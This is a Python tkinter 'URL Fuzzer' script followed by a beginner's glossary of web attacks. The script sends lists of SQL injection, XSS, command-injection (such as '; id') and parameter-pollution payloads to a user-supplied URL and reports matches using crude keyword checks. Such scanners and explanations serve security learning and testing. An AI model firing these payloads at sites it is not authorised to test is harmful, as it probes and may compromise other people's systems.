import tkinter as tk
from tkinter import messagebox
import requests

# Common payloads for different attack types
sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 1=1--", "\" OR \"\"=\"", "' OR ''='"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "\" onmouseover=alert('XSS') //"]
rce_payloads = ["; ls", "| ls", "&& ls", "| id", "&& id", "; id"]
param_pollution_payloads = ["&param=value&param=value2", "?id=1&id=2"]

def check_sql_injection(url):
    results = []
    for payload in sql_payloads:
        try:
            response = requests.get(url + payload)
            if "syntax" in response.text or "SQL" in response.text:
                results.append(f"Potential SQL Injection vulnerability with payload: {payload}")
        except Exception as e:
            results.append(f"Error with payload {payload}: {e}")
    return results

def check_xss(url):
    results = []
    for payload in xss_payloads:
        try:
            response = requests.get(url + payload)
            if payload in response.text:
                results.append(f"Potential XSS vulnerability with payload: {payload}")
        except Exception as e:
            results.append(f"Error with payload {payload}: {e}")
    return results

def check_rce(url):
    results = []
    for payload in rce_payloads:
        try:
            response = requests.get(url + payload)
            if "uid=" in response.text or "root" in response.text:
                results.append(f"Potential RCE vulnerability with payload: {payload}")
        except Exception as e:
            results.append(f"Error with payload {payload}: {e}")
    return results

def check_parameter_pollution(url):
    results = []
    for payload in param_pollution_payloads:
        try:
            response = requests.get(url + payload)
            if "duplicate" in response.text or "parameter" in response.text:
                results.append(f"Potential Parameter Pollution vulnerability with payload: {payload}")
        except Exception as e:
            results.append(f"Error with payload {payload}: {e}")
    return results

def fuzz_url():
    url = url_entry.get()
    if not url:
        messagebox.showwarning("Input Error", "Please enter a URL")
        return
    
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    result_text.delete(1.0, tk.END)

    sql_results = check_sql_injection(url)
    xss_results = check_xss(url)
    rce_results = check_rce(url)
    param_pollution_results = check_parameter_pollution(url)

    if not sql_results:
        result_text.insert(tk.END, "No SQL Injection vulnerabilities found.\n")
    else:
        result_text.insert(tk.END, "\n".join(sql_results) + "\n")

    if not xss_results:
        result_text.insert(tk.END, "No XSS vulnerabilities found.\n")
    else:
        result_text.insert(tk.END, "\n".join(xss_results) + "\n")

    if not rce_results:
        result_text.insert(tk.END, "No Remote Code Execution vulnerabilities found.\n")
    else:
        result_text.insert(tk.END, "\n".join(rce_results) + "\n")

    if not param_pollution_results:
        result_text.insert(tk.END, "No Parameter Pollution vulnerabilities found.\n")
    else:
        result_text.insert(tk.END, "\n".join(param_pollution_results) + "\n")

# GUI Setup
root = tk.Tk()
root.title("URL Fuzzer")

tk.Label(root, text="Enter URL:").grid(row=0, column=0, padx=10, pady=10)
url_entry = tk.Entry(root, width=50)
url_entry.grid(row=0, column=1, padx=10, pady=10)

fuzz_button = tk.Button(root, text="Fuzz URL", command=fuzz_url)
fuzz_button.grid(row=1, column=1, pady=10)

result_text = tk.Text(root, height=20, width=80)
result_text.grid(row=2, column=0, columnspan=2, padx=10, pady=10)

root.mainloop()

Here's a breakdown of each term:

1. XSS Attack (Cross-Site Scripting)
What It Is: XSS (Cross-Site Scripting) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts (usually JavaScript) into content that other users will view. This can lead to stealing cookies, session tokens, or other sensitive information, or performing actions on behalf of users without their knowledge.
Example: If a website displays user comments without properly sanitizing them, an attacker could post a comment containing a malicious script. When other users view the comment, their browsers execute the script, potentially compromising their data.
2. SQL Injection Attack
What It Is: SQL Injection is a type of attack where the attacker manipulates a web application's database queries by injecting malicious SQL code into an input field. This can allow unauthorized access to data, deletion of data, or even complete control over the database.
Example: If a login form is vulnerable, an attacker could enter ' OR '1'='1 in the username field and bypass authentication, gaining unauthorized access to the application.
3. Remote Code Execution (RCE)
What It Is: RCE is a severe vulnerability where an attacker can execute arbitrary code on a server or system remotely. If an application improperly handles user input, an attacker might be able to inject commands that the server executes, potentially taking control of the server.
Example: If a web application allows users to upload files and fails to sanitize the input, an attacker might upload a script that the server executes, granting the attacker remote control over the system.
4. Parameter Pollution
What It Is: Parameter Pollution occurs when an attacker sends multiple instances of the same parameter in a request, potentially causing the server to behave unexpectedly. This can be used to bypass security controls or trigger unintended functionality.
Example: If an application expects a single id parameter, an attacker could send a request like ?id=1&id=2, causing the application to mishandle the request, possibly exposing or manipulating unintended data.
What Is a Payload?
Definition: A payload is a piece of data (like a string, script, or binary code) sent as part of an attack. In the context of web security, a payload is often the malicious input designed to exploit a vulnerability, such as the injected script in an XSS attack or the SQL code in an SQL injection.
Example: In an SQL injection attack, a payload might be "' OR '1'='1"; in an XSS attack, it could be <script>alert('XSS')</script>.
These concepts are fundamental to understanding web application security and are critical areas to focus on when testing or securing web applications.
